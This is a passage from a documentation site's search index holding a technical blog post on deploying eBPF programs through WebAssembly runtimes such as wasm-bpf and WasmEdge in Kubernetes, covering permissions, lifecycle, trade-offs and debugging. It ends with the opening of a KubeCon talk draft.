Linux kernel. It enables dynamic and programmable extensions for tasks like networking, tracing, and security. However, deploying eBPF programs at scale comes with its own set of challenges around permissions, lifecycle management, and pluggability.</p> <p>WebAssembly, on the other hand, is designed for portability, security, and high performance. Its secure sandboxed execution model and emerging interfaces like WASI are well-suited for cloud-native applications and plugin systems. This blog post discusses how integrating eBPF programs with WebAssembly runtimes like WasmEdge and wasm-bpf can address many of the challenges of deploying eBPF in containerized environments like Kubernetes.</p> <p>The post provides background on eBPF and Wasm, examines the deployment challenges of eBPF in Kubernetes, and explains how a webassembly runtime and toolchain like WasmEdge and wasm-bpf work to simplify eBPF deployments while also enhancing security. It explores examples of leveraging the integration for improved observability, debugging, and access control. Overall, the combination of these technologies opens up new possibilities for advanced yet lightweight capabilities across cloud-native ecosystems.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#table-of-contents","title":"Table of Contents","text":"<p>autoauto- Securing and Simplifying eBPF Deployments with WebAssemblyauto    - introductionauto    - Table of Contentsauto    - Background: eBPF and Wasm in Cloud-Native Ecosystemsauto    - How can Wasm enhance eBPFauto        - Current deploy models of eBPFauto        - Summary: challenges for eBPF in Kubernetesauto        - How WebAssembly can bring to eBPF deployments in Kubernetesauto        - Wasm-bpf: A Paradigm Shift in eBPF Deploymentsauto        - Enhancing eBPF Deployment: Efficiency and Easeauto    - Elevating Security in eBPF Deploymentsauto        - trade offsauto        - Running eBPF with WebAssembly in Docker Containersauto        - Streamlining eBPF Development with Wasm-bpfauto        - Examples of wasm-bpfauto        - Challenges of eBPF for Wasm: Bridging Architecture and Kernel Dependenciesauto        - How it works: Wasm-bpfauto        - Wasm with userspace eBPFauto    - Wasm + eBPF + LLMauto    - How can eBPF enhance Wasm: WASI and Debuggingauto        - Enhancing WASI access control with eBPFauto        - Wasm runtime Debug with eBPFauto        - Other possibilitysauto    - conclusion and takeawaysauto    - referenceautoauto</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#background-ebpf-and-wasm-in-cloud-native-ecosystems","title":"Background: eBPF and Wasm in Cloud-Native Ecosystems","text":"<p>In the cloud-native ecosystem, eBPF (Extended Berkeley Packet Filter) and WebAssembly (Wasm) serve as emerging technologies facilitating advanced operational capabilities.</p> <p><code>eBPF</code> (Extended Berkeley Packet Filter) enables dynamic and secure programming within the Linux kernel, enhancing networking, observability, tracing, and security capabilities efficiently in modern cloud-native environments. This technology allows for the injection of bytecode into the kernel at runtime, which the kernel can then verify and execute in response to various events.</p> <p><code>WebAssembly</code> (Wasm), on the other hand, is a binary instruction format and a compilation target for high-level languages, enabling developers to run sandboxed executable code in web browsers and server-side virtual machine. Wasm is designed to be portable, secure, and execute at near-native speeds, making it an ideal runtime for web applications and increasingly for server-side containerized applications.</p> <p><code>The differences between eBPF and Wasm</code>: Wasm operates within a sandboxed environment, emphasizing security. It incorporates run-time checks for arbitrary code execution, which, while bolstering safety, introduces some performance overhead. Additionally, Wasm boasts a robust language support and ecosystem, making it versatile and conducive to various applications. Contrastingly, eBPF is finely tuned towards performance optimization. It employs static verification methods, minimizing run-time checks as the functionalities are predetermined before execution. eBPF is predominantly used with small C programs, emphasizing its focus on performance and efficiency.</p> <p>In essence, while both technologies are instrumental in enhancing the execution of code, Wasm leans more towards flexibility and security, whereas eBPF focuses on performance and efficiency. This delineation marks the fundamental differences in their design philosophies and application domains.</p> <p><code>WasmEdge</code> is a lightweight and high-performance Wasm runtime that has been integrated into Docker CLI, allowing for seamless deployment of both containerized and Wasm-based applications within the same infrastructure. This integration underscores the cloud-native commitment to interoperability and the ability to abstract underlying infrastructure complexities away from developers and operators. <code>WasmEdge</code> can also be used as a plugin system for mutiple languages.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#how-can-wasm-enhance-ebpf","title":"How can Wasm enhance eBPF","text":"<p>In the following part, we will discuss how WebAssembly can help enhance the deployment of eBPF programs.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#current-deploy-models-of-ebpf","title":"Current deploy models of eBPF","text":"<p>In large-scale projects, like cilium, pixie, tetragon, falco, the prevalent strategy is to <code>closely integrate the monitoring or management tools within the core application</code>, often referred to as the \"control plane.\"</p> <p>An alternative to this integration, like bumblebee, inspektor-gadget, bpfd, is the use of Remote Procedure Calls (RPCs) to communicate between the control plane application and a dedicated <code>BPF daemon</code>. This is mostly used for deploying specific eBPF tools or scripts, they are usually in a smaller size.</p> <p>The first approach of deploying eBPF programs allows for a seamless interaction with the system's internals, providing an efficient means of observation and manipulation of low-level operations.</p> <p>However, this tight integration is not without its drawbacks. If you use traditional containers to deploy smaller eBPF tools or probes, it's <code>heavy weight</code> and resource consuming.</p> <p>Another significant challenge is the application requires <code>extensive permissions</code>. The current eBPF access control model often require CAP_SYS_ADMIN capability for accessing all features. However, CAP_SYS_ADMIN carries inherent risks, particularly to containers, due to its extensive privileges. Despite more capabilities like <code>CAP_PERFMON</code> and <code>CAP_BPF</code> were introduced to allow more granular control over BPF operations, it also lacks <code>namespace constraints</code>, meaning it can access all kernel memory rather than being container-specific.</p> <p>Moreover, the complexity introduced by the need to <code>manage multi-user environments</code>. This can lead to conflicts where one eBPF program overrides another, resulting in silent failures or unpredictable behavior.</p> <p>Another approach is the use of Remote Procedure Calls (RPCs) to communicate between the control plane application and a dedicated <code>BPF daemon</code>. This BPF daemon acts as an intermediary, managing the BPF lifecycle and permissions. While this decouples the BPF functionality from the application, it introduces its own set of issues.</p> <p>The daemon delegation model implies an <code>additional critical component</code> in the production environment, which increases the risk of failures. Troubleshooting and debugging become more challenging when another layer is involved.</p> <p>Moreover, <code>maintaining consistency</code> during updates is another pain point. When <code>new kernel features</code> are introduced, not only does the kernel dependency need to be managed, but the daemon itself also requires updates and deployment, which can slow down the adoption of new capabilities. This model also imposes an <code>additional support burden</code> as loaders have to be compatible with both tight integration and daemon delegation scenarios. Ensuring that the application and the daemon are upgraded or downgraded atomically to avoid compatibility issues is also a complex task. The problem is further compounded when considering that operating system distributions or cloud providers may each introduce their proprietary daemons, leading to a fragmented ecosystem.</p> <p>In summary, while tight integration offers <code>efficiency and direct control</code>, it requires careful coordination and broad permissions. On the other hand, daemon delegation provides a layer of abstraction at the cost of <code>additional complexity and potential delays</code> in leveraging new features. Each model carries its own set of \"cons,\" and the choice between them would depend on the specific requirements and constraints of the project in question.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#summary-challenges-for-ebpf-in-kubernetes","title":"Summary: challenges for eBPF in Kubernetes","text":"<p>Deploying eBPF in Kubernetes clusters also adds another layer of complexity. To summarize the challenges of deploying eBPF with different models:</p> <ol> <li> <p>Security Risks with Privileged Access: eBPF applications necessitate elevated access levels in Kubernetes, often requiring privileged pods. The minimum requirement is CAP_BPF capabilities, but the actual permissions may extend further, depending on the eBPF program type. The broad scope of Linux capabilities complicates the restriction of privileges to the essential minimum. This can inadvertently introduce security vulnerabilities, for instance, a compromised eBPF program could extract sensitive data from the host or other containers and could potentially execute in the host namespace, breaching container isolation.</p> </li> <li> <p>Compatibility Issues with eBPF Hooks and Kernel Versions: The eBPF infrastructure in Linux kernels can have limitations, such as certain hooks not supporting concurrent multiple programs. Without a standardized method to handle the interplay between various applications, coordination becomes more intricate, potentially leading to conflicts. While CO-RE (Compile Once - Run Everywhere) enhances portability across various kernel versions, disparities in feature support, such as 'perf event' and 'ring buffer', remain due to kernel version differences, affecting cross-version compatibility.</p> </li> <li> <p>Complex Lifecycle and Deployment Management: Orchestrating the lifecycle of eBPF programs in Kubernetes is complex. Deployment typically involves creating a DaemonSet, which increases architectural complexity and security considerations. The process includes writing a custom agent to load eBPF bytecode and managing this agent with a DaemonSet. This necessitates an in-depth understanding of the eBPF program lifecycle to ensure persistence across pod restarts and to manage updates efficiently. Using traditional Linux containers for this purpose can be counterproductive and heavy, negating the lightweight advantage of eBPF.</p> </li> <li> <p>Challenges with Versioning and Plugability: Current eBPF deployments in Kubernetes often embed the eBPF program within the user space binary responsible for its loading and operation. This tight coupling hinders the ability to version the eBPF program independently of its user space counterpart. If users need to customize eBPF programs, for instance, to track proprietary protocols or analyze specific traffic, they must recompile both the eBPF program and user space library, release a new version, and redeploy. The absence of a dedicated package management system for eBPF programs further complicates management and version control.</p> </li> </ol> <p>There is <code>not a single solution</code> to all these challenges, but maybe we can leverage the advantages of WebAssembly (Wasm) to address some of these issues. In the next section, we will discuss how Wasm can help improve the deployment of eBPF in Kubernetes.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#how-webassembly-can-bring-to-ebpf-deployments-in-kubernetes","title":"How WebAssembly can bring to eBPF deployments in Kubernetes","text":"<p>WebAssembly (Wasm) could address some of these challenges:</p> <ul> <li> <p>lightweight: Wasm is designed to be lightweight, portable, and secure, making it an ideal runtime for cloud-native environments. Wasm workloads can seamlessly run alongside containers, easing integration into the current infrastructure. With its lightweight containers \u2014 mere 1/100th the size of typical LXC images \u2014 and rapid startup times, Wasm addresses eBPF\u2019s deployment headaches.</p> </li> <li> <p>Fine-Grained Permissions: Wasm's runtime environment prioritizes security with a deny-by-default mode, a stark contrast to the broad permissions eBPF necessitates. By leveraging WebAssembly System Interface (WASI), eBPF deployments gain the advantage of fine-grained permission controls. This setup not only tightens security by restricting access to crucial kernel resources but also creates a configurable environment where permissions are granted explicitly and judiciously.</p> </li> <li> <p>Portability and Isolation: Wasm is designed to run in a portable, isolated environment, which could simplify deployment and reduce the risk of programs interfering with one another. with Wasm for eBPF, we can build an abstraction layer to improve the portability of eBPF programs, and also provide a isolated environment for eBPF programs to run in. With userspace eBPF runtime like bpftime, we can also monitor the userspace with same toolchains, but without kernel version support and without root priviledge.</p> </li> <li> <p>Lifecycle Management:  Wasm's design inherently facilitates better lifecycle management tools and practices. Kubernetes can leverage existing container orchestration tools to manage Wasm applications, streamlining the process. And also, Wasm runtime can use the WASI-like interface to manage the eBPF programs inside the kernel.</p> </li> <li> <p>Versioning and Update Management: With Wasm plugins, eBPF programs can be versioned and updated independently of their user space counterparts. By treating eBPF packages as OCI images within Wasm modules, packaging, versioning and updating become more manageable. This enables the sandboxing of eBPF programs separate from the user space, allowing for a modular and flexible approach in tooling, particularly in observability.</p> </li> </ul> <p>In summary, while eBPF offers powerful capabilities for Kubernetes, it comes with significant challenges related to security, manageability, and operational complexity. WebAssembly could provide solutions to these challenges by offering a more secure, isolated, and manageable environment.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#wasm-bpf-a-paradigm-shift-in-ebpf-deployments","title":"Wasm-bpf: A Paradigm Shift in eBPF Deployments","text":"<p>Wasm-bpf is a WebAssembly eBPF library, toolchain and runtime powered by CO-RE(Compile Once \u2013 Run Everywhere) libbpf. It allows the construction of eBPF programs into Wasm with little to no changes to the code, and run them cross platforms with Wasm sandbox. Wasm-bpf can be used as a plugin for WasmEdge, a high-performance Wasm runtime optimized for cloud-native environments, to integrate with Kubernetes. The project allows you:</p> <ul> <li><code>Create Wasm-based eBPF control plane applications</code></li> </ul> <p>Wasm-bpf empowers developers to create Wasm-based eBPF control plane applications. These applications can tap into the control and communication mechanisms eBPF provides, but with the added advantages of Wasm's lightweight and secure environment. The result is a robust control plane capable of intricate networking and security operations, all managed with Kubernetes' native tooling.</p> <ul> <li><code>Enable Streamlined Management of eBPF programs in k8s pods with lightweight Wasm container</code></li> </ul> <p>With Wasm-bpf, managing eBPF programs becomes an integrated part of Kubernetes' orchestration:</p> <ul> <li>Lightweight Containers: Utilizing Wasm containers that are a fraction of the size of traditional LXC images, Wasm-bpf ensures that eBPF programs can be deployed rapidly and with less overhead.</li> <li>Kubernetes Pods: eBPF programs are deployed as Wasm modules within k8s pods, aligning with existing container orchestration practices and enhancing manageability.</li> <li> <p>WasmEdge Integration: As a plugin for WasmEdge, Wasm-bpf benefits from a high-performance runtime optimized for Kubernetes, ensuring seamless cloud-native integration.</p> </li> <li> <p><code>Enables Wasm plugin in eBPF core applications</code></p> </li> </ul> <p>It allows dynamic loading and unloading of eBPF programs and their control plane(Userspace) code, promoting a modular and flexible approach towards system observability and interactions. The user can write their own eBPF programs and data processing codes, and load them into the observability agents, without the need to recompile and redeploy it. This allows for a more agile and efficient development process, where eBPF programs can be updated independently of the core application for complex data processing and private protocol analysis.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#enhancing-ebpf-deployment-efficiency-and-ease","title":"Enhancing eBPF Deployment: Efficiency and Ease","text":"<p>Wasm-bpf addresses the deployment challenges by offering a runtime that's optimized for eBPF within a Wasm lightweight container:</p> <ul> <li>Size and Performance: The Wasm containers are just 1% the size of standard LXC images, coupled with a fast startup time for eBPF programs, ensuring quick deployments. Wasm also has a near native runtime performance.</li> <li>Cross-Platform Portability: With CO-RE, these eBPF programs are not just portable across different platforms but also across kernel versions, obviating the need for kernel-specific adaptations. With user space eBPF runtime, no kernel eBPF support is needed.</li> <li>Version Control: It allows for independent versioning and updating of eBPF programs, enabling them to be treated as OCI images within Wasm modules, thereby simplifying versioning and updates.</li> </ul>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#elevating-security-in-ebpf-deployments","title":"Elevating Security in eBPF Deployments","text":"<p>Wasm-bpf not only makes deployment easier but also significantly safer:</p> <ul> <li>Configurable WASI Behavior:  It provides a configurable environment with limited eBPF WASI behavior, enhancing security and control. This allows for fine-grained permissions, restricting access to kernel resources and providing a more secure environment. For instance, eBPF programs can be restricted to specific types of useage, such as network monitoring, without the need for broad permissions.</li> <li>Access Control: it can also apply RBAC to control the access of eBPF programs easily.</li> <li>Sandboxed Environment: By sandboxing the user space, Wasm-bpf enables the safe execution of eBPF programs, avoiding the risks associated with privileged access levels in traditional deployments. This can also help enable eBPF plugins in observability agents.</li> </ul> <p>In essence, Wasm-bpf is crafted to mitigate the inherent challenges faced when deploying eBPF in Kubernetes environments. It leverages the strengths of WebAssembly to make eBPF deployments not only easier and more efficient but also significantly more secure.</p> <p>By encapsulating eBPF programs in lightweight, portable, and secure Wasm modules, Wasm-bpf streamlines the lifecycle and versioning management, offering a sophisticated solution that aligns with the dynamic and scalable nature of cloud-native ecosystems. As Kubernetes continues to evolve, Wasm-bpf stands ready to play a critical role in simplifying and securing eBPF deployments across the cloud-native landscape.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#trade-offs","title":"trade offs","text":"<p>While Wasm-bpf presents a promising solution for deploying eBPF programs within Kubernetes, it's essential to consider the trade-offs and limitations that come with this new approach:</p> <ol> <li> <p>Library Portability:</p> <p>Existing libraries like libbpf and libbpf-rs need to be ported to work within the Wasm environment. This requires additional development effort and could introduce compatibility issues or feature limitations.</p> </li> <li> <p>Learning Curve:</p> <p>Developers may need to learn new language SDKs tailored for Wasm. This investment in time and resources can be significant, especially for teams already accustomed to existing eBPF toolchains.</p> </li> <li> <p>Feature limited:</p> <p>eBPF features available within the Wasm environment might be limited compared to those in the native Linux kernel eBPF. Some advanced eBPF functionalities may not be fully supported or may require significant workarounds to be operational in Wasm.</p> </li> <li> <p>Kernel Version Support:</p> <p>Even though Wasm-bpf leverages CO-RE to enable cross-platform compatibility, the underlying eBPF programs may still require specific kernel version support. This could limit the deployment of certain eBPF programs to environments with the requisite kernel versions.</p> </li> <li> <p>Performance Overheads:</p> <p>Running eBPF programs in a Wasm sandbox may introduce slightly performance overheads due to additional abstraction layers and the limitation of WebAssembly itself. This should be acceptable for most use cases but might be a bottleneck for performance-critical applications.</p> </li> <li> <p>Complexity in Debugging:</p> <p>Debugging issues across the Wasm and eBPF boundary might become more complex. The encapsulation provided by Wasm's sandbox can also obscure problems that would be more apparent in a native environment.</p> </li> <li> <p>Ecosystem Maturity:</p> <p>The Wasm ecosystem, particularly in the context of eBPF, is relatively new compared to the mature tooling available for native eBPF. This can lead to challenges in finding support, documentation, and community-tested practices.</p> </li> </ol> <p>The introduction of Wasm-bpf is undoubtedly an exciting development, yet it's important to weigh these trade-offs when considering its adoption. For organizations with existing eBPF workloads or those looking to exploit the full range of eBPF capabilities, a careful evaluation of the potential impacts on performance, compatibility, and developer productivity is necessary.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#running-ebpf-with-webassembly-in-docker-containers","title":"Running eBPF with WebAssembly in Docker Containers","text":"<p>In the pursuit of harnessing the power of eBPF within lightweight containers, the integration of WebAssembly (Wasm) emerges as a significant advancement. The command-line image depicted showcases the process of utilizing eBPF tools within a WebAssembly-based Docker container, enabling the real-time monitoring of process execution and exits directly in the kernel.</p> <p>WebAssembly containers offer a lighter and more configurable alternative to traditional LXC (Linux Containers). The commands demonstrate the ease with which a user can build, push, pull, and run eBPF tools in this environment, mirroring the familiar workflow of standard Docker commands but with the added benefits of Wasm's agility and security features.</p> <p>Furthermore, this approach facilitates the use of container tools and Open Container Initiative (OCI) storage to efficiently manage eBPF programs. With these tools, developers can now achieve unparalleled control over, and interaction with, eBPF and a wide array of system resources that eBPF can tap into, paving the way for sophisticated containerized applications that are both performant and secure.</p> <p></p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#streamlining-ebpf-development-with-wasm-bpf","title":"Streamlining eBPF Development with Wasm-bpf","text":"<p>Wasm-bpf allows developers to convert eBPF programs into Wasm modules with minimal code changes. The development experience with Wasm-bpf mirrors that of the traditional libbpf-bootstrap process. This means that developers who are accustomed to working with libbpf can transition to Wasm-bpf with ease. The goal is to reduce friction in porting existing eBPF tools to the Wasm platform.</p> <p>Over 10 tools from the BCC (BPF Compiler Collection) have been successfully ported, along with a variety of use cases in languages like C/C++, Go, and Rust.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#examples-of-wasm-bpf","title":"Examples of wasm-bpf","text":"<p>With wasm-bpf, developers can now leverage eBPF for a wide spectrum of scenarios, ranging from observability to networking and security, with seamless transitions between them.</p> <ul> <li>Observability with Uprobes</li> </ul> <p>Uprobes, or user-space probes, are crucial for monitoring the behavior of user-space applications. By instrumenting specific parts of the code, developers can receive valuable insights into the application's performance and behavior. wasm-bpf enables the insertion of uprobes in a more streamlined manner, making observability tasks less cumbersome and more integrated into the development process.</p> <ul> <li>Networking with XDP</li> </ul> <p>eBPF shines in the networking domain, and XDP (eXpress Data Path) is one of its star features. It allows for high-performance packet processing at the earliest possible point in the software stack. With wasm-bpf, XDP programs can be written and deployed with the flexibility and portability that WebAssembly offers, opening new doors for network function development.</p> <ul> <li>Security with LSM</li> </ul> <p>Linux Security Modules (LSM) are a framework that provides various hooks for security checks within the Linux kernel. eBPF has been increasingly used to extend LSM capabilities without the need for kernel changes. wasm-bpf stands to simplify the development of these security-centric eBPF programs, making it easier to build complex security policies and enforce them within the kernel.</p> <p>These examples signify just the tip of the iceberg when it comes to the versatility of eBPF use cases facilitated by wasm-bpf. The ability to deploy eBPF programs across different domains without significant rewrites or adjustments is a testament to the power of wasm-bpf.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#challenges-of-ebpf-for-wasm-bridging-architecture-and-kernel-dependencies","title":"Challenges of eBPF for Wasm: Bridging Architecture and Kernel Dependencies","text":"<p>The integration of eBPF with WebAssembly (Wasm) within Kubernetes is a promising approach but comes with its own set of challenges:</p> <ol> <li>Porting Libraries and Preparing Toolchains:</li> </ol> <p>For different programming languages, there are corresponding libraries to interface with eBPF. These need to be ported to work with Wasm:</p> <ul> <li>C/C++: <code>libbpf</code> is the standard library for working with eBPF in C/C++. Adapting this to work within the Wasm environment requires ensuring compatibility with Wasm's execution model.</li> <li>Rust: <code>libbpf-rs</code> provides Rust bindings for <code>libbpf</code>. These bindings must be made compatible with Wasm to maintain performance and functionality.</li> <li> <p>Go: The Go language has its own eBPF library, <code>cilium/go</code>. This too must be adapted for a Wasm runtime, which can be non-trivial given Go's runtime and garbage collection features.</p> </li> <li> <p>Differences in Data Layout Between Wasm and eBPF:</p> </li> </ul> <p>Wasm currently operates in a 32-bit environment, whereas eBPF is designed for a 64-bit architecture. This difference in data layout can lead to complications like different struct sizes, different pointer widths, particularly when handling data structures that are designed with 64-bit systems in mind.</p> <p>To address this, toolchains are utilized to generate bindings that can translate between the two architectures. This minimizes the need for serialization and deserialization, which can degrade performance.</p> <ol> <li>Portability for eBPF:</li> </ol> <p>eBPF's functionality can depend heavily on the Linux kernel version, but newer features often requiring the latest kernel releases.</p> <p>CO-RE: This feature allows eBPF programs to be more portable across different kernel versions by providing a pointer relocation at runtime that doesn't require recompilation. This can help mitigate kernel compatibility issues.</p> <p>A compatible layer for kernel features: Some eBPF features may not be supported in all kernel versions. For instance, the <code>ringbuf</code> feature is only available in kernel versions 5.4 and above, while <code>perf_event</code> is available in kernel versions 4.9. This can be addressed by providing a compatible layer that emulates the missing functionality.</p> <p>Userspace eBPF Runtime: For systems where updating the kernel isn't feasible, a userspace eBPF runtime can be employed. This allows eBPF programs to run without direct kernel support, which is crucial for environments where kernel modifications are restricted.</p> <p>Once these hurdles are overcome, developers can leverage the power of eBPF in a more flexible and secure manner, enabled by the capabilities of Wasm.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#how-it-works-wasm-bpf","title":"How it works: Wasm-bpf","text":"<p>The <code>wasm-bpf</code> project essentially wants to treat the Wasm sandbox as an alternative user-state runtime space on top of the OS, allowing Wasm applications to implement the same programming model and execution logic in the sandbox as eBPF applications that normally run in the user state.</p> <p>Wasm-bpf would require a runtime implementation like the WASI, and some runtime libraries compiled to Wasm bytecode inside the sandbox to provide complete support. It also need some toolchains to package the eBPF kernel code and userspace part into an application.</p> <p>Wasm-bpf provides the following mechanishs:</p> <ul> <li>A Wasm module can operate multiple eBPF programs.</li> <li>An instance of an eBPF program can also be shared by multiple Wasm modules</li> <li>The ability to <code>dynamically load</code> eBPF programs from the Wasm sandbox into the kernel, select the desired mount points to mount them, unmount them, control the complete lifecycle of multiple eBPF bytecode objects, and support most eBPF program types.</li> <li>Bi-directional communication with the kernel via multiple types of eBPF Maps, and <code>share memory maps</code> between Wasm and kernel.</li> <li>Efficient sending of messages from the kernel state to the user state (and vice versa) via <code>ring buffering</code> and perf event polling.</li> <li>It can be adapted to most application scenario that uses eBPF programs, and can evolve and extend as kernel features are added, without requiring changes to the Wasm VM's system interface.</li> </ul> <p>To develop an eBPF program, we first need to compile the corresponding source code into bpf bytecode using the clang/LLVM toolchain, which contains the corresponding data structure definitions, maps and progs definitions. progs are program segments, and maps can be used to store data or for bidirectional communication with the user space. After that, we can implement a complete eBPF application with the help of the user state development framework and the loading framework. Wasm-bpf also follows a similar approach.</p> <p>In the Wasm-bpf project, with the support of code generation techniques and BTF (BPF type format) information in the toolchain, all communications between Wasm and eBPF do not need to <code>go through serialization</code> and deserialization mechanisms. At the same time, the eBPF-Wasm development experience for user-state programs is improved by <code>automatically generating skeleton</code> (bpf code framework) and type definitions, just like the bpftool does.</p> <p>Typically, a compiled eBPF-Wasm module is only about <code>90Kb</code> and can be dynamically loaded into the kernel and executed in less than <code>100ms</code>.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#wasm-with-userspace-ebpf","title":"Wasm with userspace eBPF","text":"<p>Wasm with kernel eBPF enable more possibilities, but require kernel version or configure support and privilege to interact with Linux kernel.</p> <p>We have a new general-purpose userspace eBPF runtime <code>bpftime</code> now, which doesn't rely on kernel and no privilege need to load the eBPF program and interact with it. It doesn't provide as many functions as kernel does, but can still use Uprobe and Syscall tracepoints to trace or observe applications in userspace. The uprobe and syscall tracepoints doesn't required mannual integration or restart the application been attached, it work just like kernel eBPF kprobe in userspace and compatible with kernel uprobe, but can speed up 10x than kernel uprobe. It may also work together with DPDK for network packet processing.</p> <p>it's compatible with kernel eBPF toolchains and provides interprocess maps support, can run existing bcc tools and bpftrace in userspace without any modification.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#wasm-ebpf-llm","title":"Wasm + eBPF + LLM","text":"<p>2023 is the year of AI and large language models. With LLM, we are able to generate eBPF with natural language and run it inside the kernel as a safe kernel extension.</p> <p>However, the AI generated code cannot be trusted, espically with a powerful priviledge and operations in the kernel. It could kill critical process, write data to any address of any process in user space (bpf_probe_write_user[5]), modify the return value of kernel functions, and even cause the kernel crash in some cases. This can lead to a very high security risks and is unacceptable.</p> <p>The generated eBPF program needs a isolation runtime to deploy and run, but the LXC is heavy and slow to start, it also need a wide privilidge on exection eBPF program and lacks namespace constraints on what BPF can do in the kernel.</p> <p>WebAssembly can be lightweight and cheaper than Docker or vm, and we are also able to do configurable fined-grain access control on what kind of eBPF programs can be loaded in kernel, what kind of attach event it can access with the WASI-like interface on eBPF, improve the security and performance of code-gen eBPF programs.</p> <p>With our agent and GPT4, we can have a maximum <code>80%</code> rate to generate tracing eBPF scripts in bpftrace successfully can correctly.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#how-can-ebpf-enhance-wasm-wasi-and-debugging","title":"How can eBPF enhance Wasm: WASI and Debugging","text":"<p>WebAssembly (Wasm) has been a significant leap forward in the realm of portable binary instruction formats. Accoding to a survey in 2023, the top two features that WebAssembly needs to enhance are a better WASI (WebAssembly System Interface) and a better debugging toolchain. That's where eBPF may comes into play, offering solutions to elevate Wasm\u2019s utility within the ecosystem.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#enhancing-wasi-access-control-with-ebpf","title":"Enhancing WASI access control with eBPF","text":"<p>The WebAssembly System Interface (WASI) is pivotal in managing how Wasm modules interact with the host system. Currently, WASI ensures that an accessed path is within an allowed list before granting access. This implementation, while functional, is not without its challenges. It can be error-prone, often relying heavily on code reviews to prevent security lapses. Furthermore, its configurability is limited, offering only directory-level granularity instead of more precise file-level control.</p> <p>eBPF can significantly enhance WASI by introducing programmable access control within the Linux kernel. With eBPF's Linux Security Module (LSM) and seccomp capabilities, developers can write custom policies that offer granular control over what Wasm modules can access, down to specific files and operations.</p> <p>Consider an example where there's a need to hook into directory removal operations to check permissions for a specific directory. Here, eBPF can be employed to intercept these operations at the kernel level and execute custom verification logic, providing a more robust and flexible access-control mechanism for WASI.</p> <p>Besides LSM hooks in the kernel, we can also use uprobes or userspace eBPF runtime to dynamically control the behavior of WASI, hotpatching the vulnerabilities in wasm runtime, without mannually intergration in Wasm runtimes.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#wasm-runtime-debug-with-ebpf","title":"Wasm runtime Debug with eBPF","text":"<p>When it comes to debugging, Wasm's current tracing methodologies are somewhat rudimentary, lacking the depth required for intricate analysis. eBPF's uprobes (user-space probes) can bridge this gap by enabling detailed tracing of any user-space function invoked by a Wasm module, all without the need for additional code instrumentation.</p> <p>For instance, memory allocation within a Wasm runtime like WasmEdge could be traced using uprobes. This would allow developers to gain insights into the memory behavior of their applications, identifying bottlenecks or leaks that could affect performance and stability.</p> <p>Additionally, user-space eBPF runtimes such as <code>bpftime</code> facilitate rapid and powerful uprobes that don't require kernel modifications or root privileges, making the debugging process less invasive and more accessible.</p>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#other-possibilitys","title":"Other possibilitys","text":"<ul> <li>Bi-direction ring buffer may enable high speed interprocess communition between different vm instants</li> <li>AF_XDP for fast packet processing in Webassembly runtimes</li> </ul>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#conclusion-and-takeaways","title":"conclusion and takeaways","text":"<p>In essence, eBPF's integration with Wasm paves the way for more sophisticated and secure system interfaces and debugging capabilities. Here is the 5 key takeaways for this blog:</p> <ol> <li>eBPF and WebAssembly are powerful emerging technologies that can be combined to enhance system capabilities, but eBPF deployment has challenges related to security, manageability and complexity.</li> <li>Wasm-bpf provides a runtime and toolchain that allows eBPF programs to be packaged and run as lightweight Wasm modules, addressing many of eBPF's deployment challenges in containers and Kubernetes.</li> <li>Running eBPF programs within the secure and isolated sandbox of Wasm improves security by enabling fine-grained permissions and access controls via WASI.</li> <li>Wasm-bpf streamlines the development process for eBPF by enabling independent versioning of programs as OCI images and providing Kubernetes integration.</li> <li>Beyond just deployment, eBPF can also enhance Wasm by improving WASI access controls and enabling powerful user-space program tracing with uprobes to aid debugging.</li> </ol>"},{"location":"others/miscellaneous/wasm-bpf-kubecon/#reference","title":"reference","text":"<ul> <li>Wasm-bpf: https://github.com/eunomia-bpf/wasm-bpf</li> <li>WasmEdge eBPF plugin: https://github.com/WasmEdge/WasmEdge/tree/master/plugins/wasm_bpf</li> <li>bpfd: https://bpfd.dev/#why-ebpf-in-kubernetes</li> <li>Cross Container Attacks: The Bewildered eBPF on Clouds: https://www.usenix.org/conference/usenixsecurity23/presentation/he</li> <li>eBPF - The Silent Platform Revolution from Cloud Native: https://conferences.sigcomm.org/sigcomm/2023/files/workshop-ebpf/1-CloudNative.pdf</li> <li>Userspace full-featured eBPF runtime: https://github.com/eunomia-bpf/bpftime</li> <li>POSTER: Leveraging eBPF to enhance sandboxing of WebAssembly runtimes: https://dl.acm.org/doi/fullHtml/10.1145/3579856.3592831 - We have done similar works early this year</li> </ul> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/wasm-bpf-talk/","title":"talk draft in kubecon","text":""},{"location":"others/miscellaneous/wasm-bpf-talk/#introductionopening-1-minute","title":"IntroductionOpening (1 minute)","text":"<p>Welcome, everyone.</p> <p>Thank you for joining me to discuss the innovative intersection of eBPF and WebAssembly\u2014technologies revolutionizing observability within our systems.</p> <p>Combining eBPF with Wasm provides a robust solution for non-intrusive deployment and advanced security checks within Kubernetes pods. Today, we'll explore how these technologies can be leveraged for efficient and secure software development. Let's dive into a detailed discussion on their benefits, challenges, and the future they hold.</p> <p>My name is Yusheng Zheng, currently maintaining a small community called eunomia-bpf, building open source projects to make eBPF easier to use, and exploring new technologies and runtimes related to eBPF.</p> <ul> <li>talk draft in kubecon</li> <li>IntroductionOpening (1 minute)</li> <li>Slide 15-17: Faster, easier \\&amp; safer eBPF deployment and Trade-offs (4 minutes)</li> <li>Slice 16: Use container tools to run Wasm + 